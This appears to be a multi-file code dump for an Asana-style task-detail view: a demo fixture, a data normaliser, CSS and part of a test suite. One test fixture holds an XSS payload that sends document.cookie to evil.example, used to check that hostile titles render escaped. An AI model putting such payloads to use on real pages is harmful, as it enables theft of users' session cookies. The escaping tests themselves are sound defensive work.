        { gid: "f11", name: "Channel", kind: "enum", value: "Zendesk",
          pills: [{ text: "Zendesk", color: "yellow-green" }], people: [], checked: false },
        { gid: "f12", name: "Reviewed", kind: "checkbox", value: "",
          pills: [], people: [], checked: true },
        { gid: "f13", name: "Needs Legal Review", kind: "checkbox", value: "",
          pills: [], people: [], checked: false },
        { gid: "f14", name: "Content Owner", kind: "people", value: "",
          pills: [], people: [P.priya], checked: false },
        { gid: "f15", name: "Quarter", kind: "enum", value: "Q4 2025",
          pills: [{ text: "Q4 2025", color: "indigo" }], people: [], checked: false },
        { gid: "f16", name: "Source Board", kind: "text", value: "CX Requests",
          pills: [], people: [], checked: false },
        { gid: "f17", name: "Draft URL", kind: "text", value: "",
          pills: [], people: [], checked: false },
        { gid: "f18", name: "Training Required?", kind: "enum", value: "",
          pills: [], people: [], checked: false },
        { gid: "f19", name: "Stakeholder Sign-off", kind: "people", value: "",
          pills: [], people: [], checked: false },
        { gid: "f20", name: "Notes", kind: "text", value: "Rollout follows the BCBSMA cadence",
          pills: [], people: [], checked: false },
      ],
      description: {
        markdown:
          "**Name**\n\nDana Whitfield\n\n**Email**\n\ndana.w@example.com\n\n" +
          "**What audience is this for?**\n\n- Care Navigators\n- Billing Specialists\n\n" +
          "**Describe your request.**\n\nBCBSMA is changing specialist copays " +
          "effective Oct 1. We need the member-facing macro set, the Guru card, " +
          "and the Navigator quiz updated before the window opens. Outline: " +
          "[Copay update outline](https://docs.example.com/copay-outline)",
        srcdoc:
          "<p><strong>Name</strong></p><p>Dana Whitfield</p>" +
          "<p><strong>Email</strong></p><p>dana.w@example.com</p>" +
          "<p><strong>What audience is this for?</strong></p>" +
          "<ul><li>Care Navigators</li><li>Billing Specialists</li></ul>" +
          "<p><strong>Describe your request.</strong></p>" +
          "<p>BCBSMA is changing specialist copays effective Oct 1. We need the " +
          "member-facing macro set, the Guru card, and the Navigator quiz updated " +
          "before the window opens. Outline: " +
          '<a href="https://docs.example.com/copay-outline">Copay update outline</a></p>',
      },
      subtasks: [
        { gid: "st1", name: "Update Guru card draft", done: true, assignee: "Jordan Avery", due: "Aug 1", promoted: false },
        { gid: "st2", name: "Stage Zendesk macro copy", done: true, assignee: "Dana Whitfield", due: "Aug 4", promoted: false },
        { gid: "st3", name: "Navigator quiz refresh", done: true, assignee: "Marcus Lee", due: "Aug 5", promoted: true },
        { gid: "st4", name: "Enablement session deck", done: false, assignee: "Priya Nair", due: "Aug 12", promoted: true },
        { gid: "st5", name: "Post go-live spot check", done: false, assignee: "", due: "Oct 20", promoted: false },
      ],
      attachments: [
        { gid: "a1", name: "#cx-requests thread", host: "slack" },
        { gid: "a2", name: "Copay comms plan", host: "gdrive" },
        { gid: "a3", name: "ZD-48213 pilot ticket", host: "zendesk" },
        { gid: "a4", name: "tier-table-v2.png", host: "asana" },
      ],
      stories,
      capabilities: { complete: true, due: true, comment: true, subtask: true,
                      description: true, refresh: true },
    },
  };
}
~~~~

## A · `web/src/task/shape.js`  — 174 lines · sha256 `9b2539575da6a34e8dcc4ce84e870f037f0be8e444094c9476242918f880a13e`

~~~~
// Pure viewmodel guards for the #/task surface. Every renderer downstream is
// a total function of THIS shape — normalizeData accepts any bytes the bridge
// (or a forged caller) delivers and returns a fully-defaulted viewmodel, so
// render can never throw on missing keys.

const FIELD_KINDS = new Set([
  "enum", "multi_enum", "people", "date", "number", "text", "checkbox",
]);
const STORY_KINDS = new Set(["comment", "automation", "system"]);
const TOKEN_KINDS = new Set(["text", "link", "mention"]);

function str(v) {
  return typeof v === "string" ? v : v == null ? "" : String(v);
}

function arr(v) {
  return Array.isArray(v) ? v : [];
}

function obj(v) {
  return v && typeof v === "object" && !Array.isArray(v) ? v : {};
}

export function initialsOf(name) {
  const parts = str(name).trim().split(/\s+/).filter(Boolean);
  if (!parts.length) return "?";
  const first = parts[0][0] || "";
  const last = parts.length > 1 ? parts[parts.length - 1][0] || "" : "";
  return (first + last).toUpperCase() || "?";
}

function person(v) {
  const p = obj(v);
  const name = str(p.name);
  if (!name) return null;
  return {
    name,
    initials: str(p.initials) || initialsOf(name),
    color: str(p.color),
  };
}

function pill(v) {
  const p = obj(v);
  const text = str(p.text);
  if (!text) return null;
  return { text, color: str(p.color) };
}

function field(v) {
  const f = obj(v);
  const kind = FIELD_KINDS.has(f.kind) ? f.kind : "text";
  return {
    gid: str(f.gid),
    name: str(f.name),
    kind,
    value: str(f.value),
    pills: arr(f.pills).map(pill).filter(Boolean),
    people: arr(f.people).map(person).filter(Boolean),
    checked: !!f.checked,
  };
}

function project(v) {
  const p = obj(v);
  return { board: str(p.board), section: str(p.section) };
}

function subtask(v) {
  const s = obj(v);
  return {
    gid: str(s.gid),
    name: str(s.name),
    done: !!s.done,
    assignee: str(s.assignee),
    due: str(s.due),
    promoted: !!s.promoted,
  };
}

function attachment(v) {
  const a = obj(v);
  return { gid: str(a.gid), name: str(a.name), host: str(a.host) };
}

function token(v) {
  const t = obj(v);
  const kind = TOKEN_KINDS.has(t.t) ? t.t : "text";
  return { t: kind, v: str(t.v), href: str(t.href) };
}

function story(v) {
  const s = obj(v);
  const kind = STORY_KINDS.has(s.kind) ? s.kind : "system";
  const tokens = arr(s.tokens).map(token);
  if (!tokens.length && str(s.text)) tokens.push({ t: "text", v: str(s.text), href: "" });
  return {
    gid: str(s.gid),
    kind,
    author: person(s.author),
    when: str(s.when),
    tokens,
  };
}

export function normalizeData(raw) {
  const p = obj(raw);
  const h = obj(p.header);
  const caps = obj(p.capabilities);
  return {
    connected: !!p.connected,
    demo: !!p.demo,
    task_id: str(p.task_id),
    header: {
      completed: !!h.completed,
      completed_on: str(h.completed_on),
      title: str(h.title),
      status_pill: pill(h.status_pill),
      assignee: person(h.assignee),
      collaborators: arr(h.collaborators).map(person).filter(Boolean),
      due_display: str(h.due_display),
      due_iso: str(h.due_iso),
      overdue: !!h.overdue,
      projects: arr(h.projects).map(project).filter((x) => x.board),
      freshness: str(h.freshness),
      permalink: str(h.permalink),
    },
    fields: arr(p.fields).map(field).filter((f) => f.name),
    description: {
      srcdoc: str(obj(p.description).srcdoc),
      markdown: str(obj(p.description).markdown),
    },
    subtasks: arr(p.subtasks).map(subtask).filter((s) => s.name),
    attachments: arr(p.attachments).map(attachment).filter((a) => a.name),
    stories: arr(p.stories).map(story),
    capabilities: {
      complete: !!caps.complete,
      due: !!caps.due,
      comment: !!caps.comment,
      subtask: !!caps.subtask,
      description: !!caps.description,
      refresh: !!caps.refresh,
    },
  };
}

// Feed helpers — the sort/tab/collapse controls are local UI state in
// TaskApp; these keep the transforms pure and testable.
export function visibleStories(stories, tab) {
  const all = arr(stories);
  return tab === "comments" ? all.filter((s) => s.kind === "comment") : all;
}

export function orderStories(stories, oldestFirst) {
  const all = arr(stories).slice();
  return oldestFirst ? all : all.reverse();
}

// Asana collapses the MIDDLE of a long feed: first item, "N more", last five.
export const COLLAPSE_HEAD = 1;
export const COLLAPSE_TAIL = 5;

export function collapseStories(stories, expanded) {
  const all = arr(stories);
  const max = COLLAPSE_HEAD + COLLAPSE_TAIL;
  if (expanded || all.length <= max + 1) {
    return { head: all, hidden: 0, tail: [] };
  }
  return {
    head: all.slice(0, COLLAPSE_HEAD),
    hidden: all.length - max,
    tail: all.slice(all.length - COLLAPSE_TAIL),
  };
}
~~~~

## A · `web/src/task/task.css`  — 483 lines · sha256 `5b93b968b885125d8530b96791c02108998a51ef85e4ff351cac1f919b29df55`

~~~~
/* Asana task-detail clone tokens + components for the #/task route.
   Values come from ~/.claude/plans/asana-ui-dossier.md (provisional — the
   VERIFY items get trued against the owner's production screenshots).
   Scoped under .tk-app with tk-* classes only — styles.css stays untouched. */

.tk-app {
  --tk-text: #1e1f21;
  --tk-text-2: #6d6e6f;
  --tk-placeholder: #a2a0a2;
  --tk-bg: #ffffff;
  --tk-bg-feed: #f9f8f8;
  --tk-hover: #f9f8f8;
  --tk-active: #f5f3f3;
  --tk-line: #edeae9;
  --tk-line-strong: #cfcbcb;
  --tk-blue: #4573d2;
  --tk-green: #58a182;
  --tk-green-bg: #e4f3e9;
  --tk-red: #e8384f;
  --tk-font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
    "Helvetica Neue", Helvetica, Arial, sans-serif;

  background: var(--tk-bg);
  color: var(--tk-text);
  font-family: var(--tk-font);
  font-size: 14px;
  line-height: 20px;
}
/* The global .app shell is a FIXED-HEIGHT flex column (styles.css) and every
   surface must own its scrolling — without this override the flex column
   squeezes sections (the 280px description frame shrinks first) and nothing
   below the fold is reachable. Double-class specificity beats .app no matter
   which stylesheet the bundler injects first. */
.app.tk-app {
  display: block;
  height: 100vh;
  overflow-y: auto;
}
.tk-app * { box-sizing: border-box; }
.tk-app button { font-family: var(--tk-font); cursor: pointer; }
.tk-app button:disabled { cursor: default; opacity: 0.6; }

/* ---- header ---- */
.tk-header { padding: 12px 20px 0; }
.tk-banner {
  margin: 0 -20px;
  padding: 10px 20px;
  background: var(--tk-green-bg);
  color: var(--tk-green);
  font-weight: 600;
  font-size: 13px;
}
.tk-actions {
  display: flex;
  align-items: center;
  flex-wrap: wrap;             /* 440px drilldown: wrap whole items, never squeeze */
  gap: 6px 10px;
  padding: 10px 0;
  border-bottom: 1px solid var(--tk-line);
}
.tk-actions-spacer { flex: 1; }
.tk-complete-btn {
  height: 28px;
  padding: 0 10px;
  border: 1px solid var(--tk-line-strong);
  border-radius: 6px;
  background: var(--tk-bg);
  color: var(--tk-text);
  font-size: 12.5px;
  white-space: nowrap;
  flex: none;
  transition: background 150ms ease, border-color 150ms ease;
}
.tk-complete-btn:hover:not(:disabled) { background: var(--tk-hover); }
.tk-complete-btn--done {
  border-color: var(--tk-green);
  color: var(--tk-green);
  background: var(--tk-green-bg);
}
.tk-icon-btn {
  height: 28px;
  width: 28px;
  border: none;
  border-radius: 6px;
  background: transparent;
  color: var(--tk-text-2);
  font-size: 14px;
}
.tk-icon-btn:hover:not(:disabled) { background: var(--tk-hover); }
.tk-freshness { font-size: 12px; color: var(--tk-text-2); white-space: nowrap; }
.tk-permalink { font-size: 12px; color: var(--tk-blue); text-decoration: none; white-space: nowrap; }
.tk-permalink:hover { text-decoration: underline; }
.tk-status {
  margin: 6px 20px 0;
  font-size: 12px;
  color: var(--tk-text-2);
}
.tk-title {
  margin: 14px 0 6px;
  font-size: 20px;
  font-weight: 600;
  line-height: 1.25;
  overflow-wrap: anywhere;
}

/* ---- avatars ---- */
.tk-avatar {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  border-radius: 50%;
  color: #ffffff;
  font-weight: 600;
  flex: none;
  border: 2px solid var(--tk-bg);
}
.tk-avatar-more { background: #c7c4c4; }
.tk-avatar-stack { display: inline-flex; align-items: center; }
.tk-avatar-stack .tk-avatar + .tk-avatar,
.tk-avatar-stack .tk-avatar + .tk-avatar-more { margin-left: -8px; }

/* ---- meta rows ---- */
.tk-meta { padding: 4px 0 12px; }
.tk-meta-row {
  display: flex;
  align-items: center;
  min-height: 32px;
  gap: 8px;
}
.tk-meta-label {
  width: 120px;
  flex: none;
  font-size: 12px;
  color: var(--tk-text-2);
}
.tk-meta-value { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
.tk-assignee { display: inline-flex; align-items: center; gap: 8px; }
.tk-assignee-name { font-size: 14px; }
.tk-assignee-status { font-size: 12px; color: var(--tk-text-2); }
.tk-due { font-size: 14px; }
.tk-due--overdue { color: var(--tk-red); }
.tk-due-input {
  border: 1px solid transparent;
  border-radius: 6px;
  background: transparent;
  color: var(--tk-text-2);
  font-family: var(--tk-font);
  font-size: 12px;
  padding: 2px;
  width: 30px;                 /* picker glyph only — the display string is
                                  the tk-due text; showing both reads as a
                                  duplicate date */
}
.tk-due-input::-webkit-datetime-edit { display: none; }
.tk-due-input::-webkit-calendar-picker-indicator { cursor: pointer; }
.tk-due-input:hover { border-color: var(--tk-line-strong); }
.tk-empty { color: var(--tk-text-2); }
.tk-project-board { font-size: 14px; }
.tk-project-section { font-size: 13px; color: var(--tk-text-2); }

/* ---- sections ---- */
.tk-section { padding: 10px 20px; border-top: 1px solid var(--tk-line); }
.tk-section-label {
  font-size: 12px;
  font-weight: 600;
  color: var(--tk-text-2);
  margin-bottom: 6px;
  background: transparent;
}

/* ---- field grid ---- */
.tk-field-row {
  display: flex;
  align-items: center;
  min-height: 32px;
  gap: 8px;
}
.tk-field-name {
  width: 140px;
  flex: none;
  font-size: 12px;
  color: var(--tk-text-2);
  overflow-wrap: anywhere;
}
.tk-field-value { display: flex; align-items: center; gap: 6px; flex-wrap: wrap; font-size: 13.5px; }
.tk-field-pills { display: inline-flex; gap: 4px; flex-wrap: wrap; }
.tk-field-people { display: inline-flex; gap: 10px; flex-wrap: wrap; }
.tk-field-person { display: inline-flex; align-items: center; gap: 6px; }
.tk-checkbox { font-size: 15px; color: var(--tk-text-2); }
.tk-checkbox--on { color: var(--tk-green); }
.tk-fields-toggle {
  border: none;
  background: transparent;
  color: var(--tk-text-2);
  font-size: 12px;
  padding: 6px 0 0;
}
.tk-fields-toggle:hover { color: var(--tk-text); }

/* ---- pills (enum chip palette — dossier §a, provisional tints) ---- */
.tk-pill {
  display: inline-flex;
  align-items: center;
  height: 20px;
  padding: 0 10px;
  border-radius: 10px;
  font-size: 12px;
  color: var(--tk-text);
  background: #e5ebeb;
}
.tk-pill--green { background: #d5f2d9; }
.tk-pill--red { background: #fbdcdf; }
.tk-pill--orange { background: #ffe0d3; }
.tk-pill--yellow-orange { background: #ffe9c7; }
.tk-pill--yellow { background: #faf0c8; }
.tk-pill--yellow-green { background: #e9f4c9; }
.tk-pill--blue-green { background: #d0f1ea; }
.tk-pill--aqua { background: #d0ebfa; }
.tk-pill--blue { background: #d5e4f8; }
.tk-pill--indigo { background: #e2dffc; }
.tk-pill--purple { background: #ecdcf9; }
.tk-pill--magenta { background: #f9dcf9; }
.tk-pill--hot-pink { background: #fbd9ea; }
.tk-pill--pink { background: #fee4eb; }
.tk-pill--cool-gray { background: #e5ebeb; }
.tk-pill--gray { background: #e5ebeb; }

/* ---- description ---- */
.tk-desc-head { display: flex; align-items: baseline; gap: 8px; }
.tk-desc-head .tk-section-label { margin-bottom: 6px; }
.tk-desc-edit-btn {
  border: none;
  background: transparent;
  color: var(--tk-text-2);
  font-size: 12px;
  padding: 0 4px;
}
.tk-desc-edit-btn:hover:not(:disabled) { color: var(--tk-blue); }
.tk-desc-editor { display: block; }
.tk-desc-input {
  width: 100%;
  border: 1px solid var(--tk-line-strong);
  border-radius: 8px;
  padding: 8px 10px;
  font-family: SFMono-Regular, Consolas, "Liberation Mono", Menlo, monospace;
  font-size: 12.5px;
  line-height: 18px;
  color: var(--tk-text);
  background: var(--tk-bg);
  resize: vertical;
  outline: none;
}
.tk-desc-input:focus { border-color: var(--tk-blue); }
.tk-desc-editor-bar {
  display: flex;
  align-items: center;
  justify-content: flex-end;
  gap: 8px;
  margin-top: 6px;
}
.tk-desc-status {
  flex: 1;
  font-size: 12px;
  color: var(--tk-red);
  overflow-wrap: anywhere;
}
.tk-desc-cancel {
  height: 28px;
  padding: 0 12px;
  border: 1px solid var(--tk-line-strong);
  border-radius: 6px;
  background: var(--tk-bg);
  color: var(--tk-text);
  font-size: 12.5px;
}
.tk-desc-empty {
  display: block;
  width: 100%;
  text-align: left;
  border: none;
  border-radius: 8px;
  background: var(--tk-hover);
  color: var(--tk-placeholder);
  font-size: 13.5px;
  padding: 10px 12px;
}
.tk-notes-frame {
  width: 100%;
  height: 280px;
  border: 1px solid var(--tk-line);
  border-radius: 8px;
  background: var(--tk-bg);
}

/* ---- subtasks ---- */
.tk-subtask-row, .tk-subtask-composer {
  display: flex;
  align-items: center;
  gap: 8px;
  min-height: 30px;
  border-bottom: 1px solid var(--tk-line);
}
.tk-subtask-composer { border-bottom: none; }
.tk-subcheck {
  width: 16px;
  height: 16px;
  flex: none;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  border: 1px solid var(--tk-line-strong);
  border-radius: 50%;
  font-size: 10px;
  color: var(--tk-line-strong);
}
.tk-subcheck--done {
  border-color: var(--tk-green);
  background: var(--tk-green-bg);
  color: var(--tk-green);
}
.tk-subcheck--ghost { border-style: dashed; }
.tk-subcheck--btn { padding: 0; background: var(--tk-bg); cursor: pointer; }
.tk-subcheck--btn:hover:not(:disabled) {
  border-color: var(--tk-green);
  color: var(--tk-green);
}
.tk-subtask-name { flex: 1; font-size: 13.5px; overflow-wrap: anywhere; }
.tk-subtask-name--done { color: var(--tk-text-2); }
.tk-subtask-link {
  border: none;
  background: transparent;
  text-align: left;
  padding: 0;
  font-family: var(--tk-font);
  cursor: pointer;
}
.tk-subtask-link:hover { color: var(--tk-blue); }
.tk-subtask-promoted { color: var(--tk-text-2); }
.tk-subtask-meta { font-size: 12px; color: var(--tk-text-2); flex: none; }
.tk-subtask-input {
  flex: 1;
  border: none;
  background: transparent;
  font-family: var(--tk-font);
  font-size: 13.5px;
  color: var(--tk-text);
  padding: 6px 0;
  outline: none;
}
.tk-subtask-input::placeholder { color: var(--tk-placeholder); }

/* ---- apps + attachments ---- */
.tk-app-row {
  display: flex;
  align-items: center;
  gap: 8px;
  width: 100%;
  min-height: 32px;
  border: none;
  background: transparent;
  text-align: left;
  font-size: 13.5px;
  color: var(--tk-text);
  border-radius: 6px;
  padding: 0 6px;
}
.tk-app-row:hover:not(:disabled) { background: var(--tk-hover); }
.tk-app-glyph { width: 16px; text-align: center; color: var(--tk-text-2); }
.tk-app-host { font-weight: 600; font-size: 12.5px; }
.tk-app-name { color: var(--tk-text-2); overflow-wrap: anywhere; }
.tk-att-chip {
  display: inline-flex;
  align-items: center;
  margin: 4px 6px 0 0;
  padding: 4px 10px;
  border: 1px solid var(--tk-line-strong);
  border-radius: 6px;
  background: var(--tk-bg);
  font-size: 12.5px;
  color: var(--tk-text);
}
.tk-att-chip:hover:not(:disabled) { background: var(--tk-hover); }

/* ---- activity ---- */
.tk-activity {
  background: var(--tk-bg-feed);
  border-top: 1px solid var(--tk-line);
  padding: 10px 20px 16px;
  min-height: 180px;
}
.tk-activity-bar {
  display: flex;
  align-items: center;
  gap: 4px;
  margin-bottom: 8px;
}
.tk-tab {
  border: none;
  background: transparent;
  font-size: 12.5px;
  color: var(--tk-text-2);
  padding: 4px 8px;
  border-radius: 6px;
}
.tk-tab--active { color: var(--tk-text); font-weight: 600; background: var(--tk-active); }
.tk-sort {
  border: none;
  background: transparent;
  font-size: 12px;
  color: var(--tk-text-2);
  padding: 4px 6px;
}
.tk-story { display: flex; gap: 10px; padding: 8px 0; }
.tk-story-body { flex: 1; min-width: 0; }
.tk-story-head { display: flex; align-items: baseline; gap: 8px; }
.tk-story-author { font-weight: 600; font-size: 13.5px; }
.tk-story-when { font-size: 12px; color: var(--tk-text-2); flex: none; }
.tk-story-text {
  font-size: 13.5px;
  overflow-wrap: anywhere;
  white-space: pre-wrap;
}
.tk-story--automation .tk-story-text,
.tk-story--system .tk-story-text { color: var(--tk-text-2); font-size: 12.5px; }
.tk-story--automation .tk-story-body,
.tk-story--system .tk-story-body {
  display: flex;
  align-items: baseline;
  gap: 8px;
}
.tk-story--system { padding-left: 26px; }
.tk-story-bolt { width: 16px; text-align: center; flex: none; }
.tk-story-actor { font-weight: 600; }
.tk-token-link { color: var(--tk-blue); text-decoration: none; }
.tk-token-link:hover { text-decoration: underline; }
.tk-token-mention {
  color: var(--tk-blue);
  background: #e8f0fe;
  border-radius: 10px;
  padding: 0 6px;
}
.tk-more {
  display: block;
  width: 100%;
  border: none;
  background: transparent;
  color: var(--tk-text-2);
  font-size: 12.5px;
  text-align: left;
  padding: 8px 0 8px 38px;
}
.tk-more:hover { color: var(--tk-text); }

/* ---- composer ---- */
.tk-composer {
  margin-top: 10px;
  background: var(--tk-bg);
  border: 1px solid var(--tk-line-strong);
  border-radius: 8px;
  padding: 8px 10px;
}
.tk-composer-input {
  width: 100%;
  border: none;
  resize: vertical;
  font-family: var(--tk-font);
  font-size: 13.5px;
  color: var(--tk-text);
  outline: none;
  background: transparent;
}
.tk-composer-input::placeholder { color: var(--tk-placeholder); }
.tk-composer-bar { display: flex; justify-content: flex-end; margin-top: 6px; }
.tk-comment-btn {
  height: 28px;
  padding: 0 12px;
  border: none;
  border-radius: 6px;
  background: var(--tk-blue);
  color: #ffffff;
  font-size: 12.5px;
}
.tk-comment-btn:hover:not(:disabled) { background: #3a63b8; }
~~~~

## A · `web/src/task/task.test.jsx`  — 809 lines · sha256 `3d11f842c70ab43f0281825ee31eb7bc083f34a8a0adf15dfab04c14c5d46324`

~~~~
import { describe, expect, it } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import { readFileSync } from "node:fs";
import React from "react";
import {
  normalizeData, initialsOf, collapseStories, visibleStories, orderStories,
} from "./shape.js";
import { buildDemoTask, isDemoMode } from "./demo.js";
import TaskApp from "./TaskApp.jsx";
import Header from "./Header.jsx";
import FieldGrid from "./FieldGrid.jsx";
import Description from "./Description.jsx";
import Subtasks, { CheckCircle } from "./Subtasks.jsx";
import AppsRow, { hostLabel } from "./AppsRow.jsx";
import Activity, { TokenText } from "./Activity.jsx";

const noop = () => {};

const HOSTILE = '<h1>Refund policy</h1>'
  + '<script>steal("https://evil.example/x?c=" + document.cookie)</script>'
  + '<img src="/logo.png" onerror="go(\'//evil.example/steal\')">';

const FX = buildDemoTask();
const VM = normalizeData(FX.task_data);
const CAPS_ON = VM.capabilities;
const CAPS_OFF = normalizeData(null).capabilities;

// Walk a React element tree WITHOUT rendering (the hook-free components can
// be invoked as plain functions), collecting elements matching `pred`.
function collectElements(node, pred, out = []) {
  if (node == null || typeof node !== "object") return out;
  if (Array.isArray(node)) {
    node.forEach((n) => collectElements(n, pred, out));
    return out;
  }
  if (pred(node)) out.push(node);
  if (node.props) collectElements(node.props.children, pred, out);
  return out;
}

function unescapeAttr(s) {
  return s.replace(/&quot;/g, '"').replace(/&#x27;/g, "'")
    .replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");
}

// ---------------------------------------------------------------- shape.js

describe("normalizeData totals", () => {
  it("null input yields a fully-defaulted viewmodel", () => {
    const vm = normalizeData(null);
    expect(vm.task_id).toBe("");
    expect(vm.header.title).toBe("");
    expect(vm.header.collaborators).toEqual([]);
    expect(vm.fields).toEqual([]);
    expect(vm.stories).toEqual([]);
    expect(vm.subtasks).toEqual([]);
    expect(vm.attachments).toEqual([]);
    expect(vm.description.srcdoc).toBe("");
    expect(vm.description.markdown).toBe("");
    expect(vm.capabilities).toEqual(
      { complete: false, due: false, comment: false, subtask: false,
        description: false, refresh: false });
  });

  it("garbage-typed sections degrade to defaults, never throw", () => {
    const vm = normalizeData({
      header: 5, fields: "x", stories: {}, subtasks: 9,
      attachments: null, description: [], capabilities: "yes", task_id: 42,
    });
    expect(vm.task_id).toBe("42");
    expect(vm.header.completed).toBe(false);
    expect(vm.fields).toEqual([]);
    expect(vm.stories).toEqual([]);
    expect(vm.capabilities.complete).toBe(false);
  });

  it("unknown kinds fall back: field→text, story→system, token→text", () => {
    const vm = normalizeData({
      fields: [{ name: "F", kind: "weird" }],
      stories: [{ kind: "banana", tokens: [{ t: "blob", v: "x" }] }],
    });
    expect(vm.fields[0].kind).toBe("text");
    expect(vm.stories[0].kind).toBe("system");
    expect(vm.stories[0].tokens[0].t).toBe("text");
  });

  it("a story with plain text and no tokens gains a single text token", () => {
    const vm = normalizeData({ stories: [{ kind: "comment", text: "hello" }] });
    expect(vm.stories[0].tokens).toEqual([{ t: "text", v: "hello", href: "" }]);
  });

  it("people without names are dropped; initials are derived when absent", () => {
    const vm = normalizeData({
      header: { collaborators: [{ name: "" }, { name: "Jordan Avery" }] },
    });
    expect(vm.header.collaborators).toHaveLength(1);
    expect(vm.header.collaborators[0].initials).toBe("JA");
  });

  it("initialsOf covers single names and empties", () => {
    expect(initialsOf("Jordan Avery")).toBe("JA");
    expect(initialsOf("Cher")).toBe("C");
    expect(initialsOf("")).toBe("?");
    expect(initialsOf("  a  b  c ")).toBe("AC");
  });
});

describe("feed helpers", () => {
  const mk = (n) => Array.from({ length: n }, (_, i) => ({ kind: "comment", gid: `g${i}` }));

  it("seven or fewer items never collapse", () => {
    const { head, hidden, tail } = collapseStories(mk(7), false);
    expect(head).toHaveLength(7);
    expect(hidden).toBe(0);
    expect(tail).toEqual([]);
  });

  it("eight items collapse to head 1 / hidden 2 / tail 5", () => {
    const { head, hidden, tail } = collapseStories(mk(8), false);
    expect(head).toHaveLength(1);
    expect(hidden).toBe(2);
    expect(tail).toHaveLength(5);
  });

  it("expanded shows everything", () => {
    const { head, hidden } = collapseStories(mk(30), true);
    expect(head).toHaveLength(30);
    expect(hidden).toBe(0);
  });

  it("comments tab filters automation and system rows", () => {
    const mixed = [{ kind: "comment" }, { kind: "automation" }, { kind: "system" }];
    expect(visibleStories(mixed, "comments")).toHaveLength(1);
    expect(visibleStories(mixed, "all")).toHaveLength(3);
  });

  it("orderStories reverses without mutating the source", () => {
    const src = [{ gid: "a" }, { gid: "b" }];
    const rev = orderStories(src, false);
    expect(rev.map((s) => s.gid)).toEqual(["b", "a"]);
    expect(src.map((s) => s.gid)).toEqual(["a", "b"]);
  });
});

// ---------------------------------------------------------- demo fixture

describe("demo fixture contract", () => {
  const keysOf = (o) => Object.keys(o).sort();

  it("task_data carries exactly the contract keys", () => {
    expect(keysOf(FX.task_data)).toEqual([
      "attachments", "capabilities", "connected", "demo", "description",
      "fields", "header", "stories", "subtasks", "task_id",
    ]);
  });

  it("header carries exactly the contract keys", () => {
    expect(keysOf(FX.task_data.header)).toEqual([
      "assignee", "collaborators", "completed", "completed_on", "due_display",
      "due_iso", "freshness", "overdue", "permalink", "projects", "status_pill",
      "title",
    ]);
  });

  it("capabilities carries exactly the contract keys", () => {
    expect(keysOf(FX.task_data.capabilities)).toEqual(
      ["comment", "complete", "description", "due", "refresh", "subtask"]);
  });

  it("is CX-Requests-shaped: 20 fields, 16 comments, automation + system rows", () => {
    expect(FX.task_data.fields).toHaveLength(20);
    const kinds = FX.task_data.stories.map((s) => s.kind);
    expect(kinds.filter((k) => k === "comment")).toHaveLength(16);
    expect(kinds.filter((k) => k === "automation").length).toBeGreaterThanOrEqual(2);
    expect(kinds.filter((k) => k === "system").length).toBeGreaterThanOrEqual(2);
  });

  it("survives normalizeData without loss of rows", () => {
    expect(VM.fields).toHaveLength(20);
    expect(VM.stories).toHaveLength(FX.task_data.stories.length);
    expect(VM.subtasks).toHaveLength(5);
    expect(VM.attachments).toHaveLength(4);
  });

  it("isDemoMode is false outside a browser", () => {
    expect(isDemoMode()).toBe(false);
  });
});

// -------------------------------------------------------------- TaskApp

describe("TaskApp without a bridge", () => {
  it("renders the waiting state", () => {
    const out = renderToStaticMarkup(<TaskApp />);
    expect(out).toContain("Waiting for the task bridge…");
    expect(out).toContain("route-task");
  });
});

describe("task.css layout contracts", () => {
  const css = readFileSync(new URL("./task.css", import.meta.url), "utf-8");

  it("the surface owns its scrolling (the global .app shell is a fixed-height flex column)", () => {
    // .app.tk-app double-class specificity — order-proof against the
    // bundler injecting task.css before styles.css.
    const appBlock = css.slice(css.indexOf(".app.tk-app {"), css.indexOf(".tk-app *"));
    expect(appBlock).toContain("display: block");
    expect(appBlock).toContain("height: 100vh");
    expect(appBlock).toContain("overflow-y: auto");
    expect(appBlock).not.toContain("flex-direction");
  });

  it("action-row items never squeeze-wrap at the 440px drilldown width", () => {
    expect(css).toMatch(/\.tk-actions \{[^}]*flex-wrap: wrap/);
    expect(css).toMatch(/\.tk-complete-btn \{[^}]*white-space: nowrap/);
    expect(css).toMatch(/\.tk-freshness \{[^}]*white-space: nowrap/);
    expect(css).toMatch(/\.tk-permalink \{[^}]*white-space: nowrap/);
  });

  it("the due picker collapses to its glyph (no duplicate date text)", () => {
    expect(css).toContain(".tk-due-input::-webkit-datetime-edit { display: none; }");
  });
});

describe("editor survives background pushes", () => {
  it("editingDesc resets only inside the task-change branch", () => {
    // The WS1-M7 reconcile silently re-opens the current task; a same-task
    // push closing the editor stomps an operator mid-edit (the phantom-save
    // bug). The reset must live inside the prevIdRef task-change guard.
    const src = readFileSync(new URL("./TaskApp.jsx", import.meta.url), "utf-8");
    const start = src.indexOf("bridge.taskData.connect");
    const handler = src.slice(start, src.indexOf("window.__almaTaskVm", start));
    const guardStart = handler.indexOf("prevIdRef.current = next.task_id");
    const guardEnd = handler.indexOf("}", guardStart);
    const resets = [...handler.matchAll(/setEditingDesc\(false\)/g)];
    expect(resets).toHaveLength(1);
    expect(resets[0].index).toBeGreaterThan(guardStart);
    expect(resets[0].index).toBeLessThan(guardEnd);
  });
});

describe("source guardrails", () => {
  const files = [
    "TaskApp.jsx", "Header.jsx", "FieldGrid.jsx", "Description.jsx",
    "Subtasks.jsx", "AppsRow.jsx", "Activity.jsx", "avatars.jsx",
    "shape.js", "demo.js",
  ];
  it.each(files)("%s has no raw-DOM sinks or network", (f) => {
    const src = readFileSync(new URL(`./${f}`, import.meta.url), "utf-8");
    expect(src).not.toContain("dangerouslySetInnerHTML");
    expect(src).not.toContain(".innerHTML");
    expect(src).not.toContain("fetch(");
    expect(src).not.toContain("localStorage");
  });
});

// --------------------------------------------------------------- Header

function renderHeader(over = {}, caps = CAPS_ON) {
  return renderToStaticMarkup(
    <Header header={{ ...VM.header, ...over }} capabilities={caps} busy={false}
            onToggleComplete={noop} onRefresh={noop} onOpenUrl={noop} onSetDue={noop} />);
}

describe("Header", () => {
  it("renders the title verbatim, template noise included", () => {
    const out = renderHeader();
    expect(out).toContain("BCBSMA copay update");
    expect(out).toContain("[[no value]]");
  });

  it("renders hostile titles as ESCAPED TEXT, never as markup", () => {
